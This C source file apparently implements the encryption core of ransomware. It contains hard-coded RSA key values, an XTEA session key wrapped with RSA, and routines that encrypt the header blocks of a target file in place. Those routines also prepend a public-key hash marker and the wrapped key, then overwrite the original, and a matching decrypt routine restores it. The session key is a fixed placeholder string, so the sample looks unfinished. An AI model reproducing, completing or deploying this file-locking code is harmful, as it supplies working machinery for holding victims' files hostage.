#include "crypt.h"

unsigned char n[] = "2A8B1A50F22D22E11B809387052240060B35A16CD65570BED402A9BAD" \
		   			 "74D6370BC704F0B7F94E1BACF47FC10534740D399D334074672899647" \
		   			 "0BCC0BE0BDDB87500FD07CCA23BA48EDD"; /* 7^99 and 9^97 */
unsigned char e[] = "10001";
unsigned char d[] = "A440297A1B86E802F28B9708D36948860D01221B71E6AD441485B3870" \
		   			 "9785F54023416475CFD091B87F59E170E4736E97E73B1BFA3AA3BE290" \
		   			 "2C8CF5E16B7B844AFBDFD261294BE241";

void InitXTEA(CryptEngine *engine)
{
	BYTE XTEAEncryptedKey[RSA_BLOCK_SIZE];

	engine->XTEA.XTEA_KEY_RANGE = XTEA_GENERATE_LETTERS;

	/* gen_xtea_key(xtea_data); */
	CopyMemory(engine->XTEA.XTEA_KEY, "abcdabcdabcdabcd", XTEA_KEY_SIZE);
	/* Encrypt XTEA session key */
	ZeroMemory(XTEAEncryptedKey, RSA_BLOCK_SIZE);
	RSAEncrypt(engine, engine->XTEA.XTEA_KEY, XTEA_KEY_SIZE, XTEAEncryptedKey);
	CopyMemory(engine->XTEA.RSAEncryptedKey, XTEAEncryptedKey, RSA_BLOCK_SIZE);
}

void InitRSA(CryptEngine *engine)
{
	BYTE RSAPublicKeyHex[RSA_BLOCK_SIZE];

	engine->RSA.pModulus = _BigCreate(0);
	engine->RSA.pEncryptionKey = _BigCreate(0);
	engine->RSA.pDecryptionKey = _BigCreate(0);

	_BigIn(n, 16, engine->RSA.pModulus);
	_BigIn(e, 16, engine->RSA.pEncryptionKey);
	_BigIn(d, 16, engine->RSA.pDecryptionKey);

	ZeroMemory(RSAPublicKeyHex, RSA_BLOCK_SIZE);
	_BigOutB16(engine->RSA.pEncryptionKey, RSAPublicKeyHex);
	SHA1PasswordHash(RSAPublicKeyHex, lstrlen(RSAPublicKeyHex), engine->RSA.SHA1PublicKeyHash);
}

void InitCryptEngine(CryptEngine *ptr)
{
	InitRSA(ptr);	/* RSA is used in InitXTEA (encrypting session key). Must be called first */
	InitXTEA(ptr);
}


void FreeCryptEngine(CryptEngine *engine)
{
	_BigDestroy(engine->RSA.pModulus);
	_BigDestroy(engine->RSA.pEncryptionKey);
	_BigDestroy(engine->RSA.pDecryptionKey);
}

BOOL xstrncmp(PBYTE str1, PBYTE str2, int len)
{
	int i;
	for (i = 0; i < len; i++)
		if (str1[i] != str2[i])
			return FALSE;
	return TRUE;
}

void FileEncrypt(char *filename, CryptEngine *engine)
{
	HANDLE hOriginalFile, hEncryptedFile;
	DWORD dwFileSize;
	DWORD dwBytesRead, dwBytesWritten = 0;
	int i;
	char buffer[XTEA_BLOCK_SIZE + 1] = { 0 };
	char tmpFileName[MAX_PATH];
	BYTE RSAPublicKeyHash[SHA1_HASH_LEN];

	hOriginalFile = CreateFile(filename,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hOriginalFile == INVALID_HANDLE_VALUE) return;

	/* Create temporary copy of the encrypted file */
	StringCchCopy(tmpFileName, MAX_PATH, filename);
	StringCchCat(tmpFileName, MAX_PATH, ".tmp");
	hEncryptedFile = CreateFile(tmpFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hEncryptedFile == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hOriginalFile);
		CloseHandle(hEncryptedFile);
		return;
	}

	dwFileSize = GetFileSize(hOriginalFile, NULL);
	if (dwFileSize < XTEA_BLOCK_SIZE * BLOCKS_TO_ENCRYPT)
	{
		CloseHandle(hOriginalFile);
		CloseHandle(hEncryptedFile);
		DeleteFile(tmpFileName);
		return;
	}

	/* Check if the file is already encrypted */
	ReadFile(hOriginalFile, RSAPublicKeyHash, SHA1_HASH_LEN, &dwBytesRead, NULL);
	SetFilePointer(hOriginalFile, 0, NULL, FILE_BEGIN);	/* Return file pointer */
	if (xstrncmp(RSAPublicKeyHash, engine->RSA.SHA1PublicKeyHash, SHA1_HASH_LEN))
	{
		CloseHandle(hOriginalFile);
		CloseHandle(hEncryptedFile);
		DeleteFile(tmpFileName);
		return;
	}

	/* Encrypt file header */
	for (i = 0; i < BLOCKS_TO_ENCRYPT; i++)
	{
		ZeroMemory(buffer, XTEA_BLOCK_SIZE + 1);
		SetFilePointer(hOriginalFile, i * XTEA_BLOCK_SIZE, NULL, FILE_BEGIN);
		ReadFile(hOriginalFile, buffer, XTEA_BLOCK_SIZE, &dwBytesRead, NULL);
		XTEAEncrypt(64, (uint32_t *)buffer, (uint32_t *)engine->XTEA.XTEA_KEY);
		SetFilePointer(hOriginalFile, i * XTEA_BLOCK_SIZE, NULL, FILE_BEGIN);
		WriteFile(hOriginalFile, buffer, XTEA_BLOCK_SIZE, &dwBytesWritten, NULL);
	}

	/* Write hash of RSA public key */
	WriteFile(hEncryptedFile, engine->RSA.SHA1PublicKeyHash, SHA1_HASH_LEN, &dwBytesWritten, NULL);
	/* Write 73 bytes of encrypted XTEA key to the begin of file */
	WriteFile(hEncryptedFile, engine->XTEA.RSAEncryptedKey, RSA_BLOCK_SIZE, &dwBytesWritten, NULL);
	SetFilePointer(hOriginalFile, 0, NULL, FILE_BEGIN);
	do
	{
		ReadFile(hOriginalFile, buffer, XTEA_BLOCK_SIZE, &dwBytesRead, NULL);
		WriteFile(hEncryptedFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
	} while (dwBytesRead);

	CloseHandle(hOriginalFile);
	CloseHandle(hEncryptedFile);

	/* Replace original file with encrypted file and delete temporary file */
	CopyFile(tmpFileName, filename, FALSE);
	DeleteFile(tmpFileName);
}

void FileDecrypt(char *filename, CryptEngine *engine)
{
	HANDLE hEncryptedFile, hOriginalFile;
	DWORD dwBytesRead = 0, dwBytesWritten = 0;
	int i;
	BYTE key[RSA_BLOCK_SIZE];
	BYTE rsa_block[RSA_BLOCK_SIZE];
	char buffer[XTEA_BLOCK_SIZE + 1];
	char tmpFileName[MAX_PATH];
	BYTE RSAPublicKeyHash[SHA1_HASH_LEN];

	hEncryptedFile = CreateFile(filename,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hEncryptedFile == INVALID_HANDLE_VALUE) return;

	/* Create temporary file for decrypted data */
	StringCchCopy(tmpFileName, MAX_PATH, filename);
	StringCchCat(tmpFileName, MAX_PATH, ".tmp");
	hOriginalFile = CreateFile(tmpFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hOriginalFile == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hEncryptedFile);
		CloseHandle(hOriginalFile);
		return;
	}

	/* Read SHA1 hash of RSA public key from file */
	ReadFile(hEncryptedFile, RSAPublicKeyHash, SHA1_HASH_LEN, &dwBytesRead, NULL);
	/* Check if the file is really encrypted */
	if (xstrncmp(RSAPublicKeyHash, engine->RSA.SHA1PublicKeyHash, SHA1_HASH_LEN))
	{
		/* Read encrypted XTEA key from the beginning of file */
		ZeroMemory(rsa_block, RSA_BLOCK_SIZE);
		ReadFile(hEncryptedFile, rsa_block, RSA_BLOCK_SIZE, &dwBytesRead, NULL);
		RSADecrypt(engine, rsa_block, RSA_BLOCK_SIZE, key);

		/* Decryption */
		for (i = 0; i < BLOCKS_TO_ENCRYPT; i++)
		{
			ZeroMemory(buffer, XTEA_BLOCK_SIZE);
			ReadFile(hEncryptedFile, buffer, XTEA_BLOCK_SIZE, &dwBytesRead, NULL);
			XTEADecrypt(64, (uint32_t *)buffer, (uint32_t *)key);
			WriteFile(hOriginalFile, buffer, XTEA_BLOCK_SIZE, &dwBytesWritten, NULL);
		}

		/* Write remaining (unencrypted) file data */
		do
		{
			ReadFile(hEncryptedFile, buffer, XTEA_BLOCK_SIZE, &dwBytesRead, NULL);
			WriteFile(hOriginalFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while (dwBytesRead);

		CloseHandle(hOriginalFile);
		CloseHandle(hEncryptedFile);

		/* Retain only decrypted file */
		CopyFile(tmpFileName, filename, FALSE);
		DeleteFile(tmpFileName);
	}
	else
	{
		CloseHandle(hOriginalFile);
		CloseHandle(hEncryptedFile);
		DeleteFile(tmpFileName);
	}
}
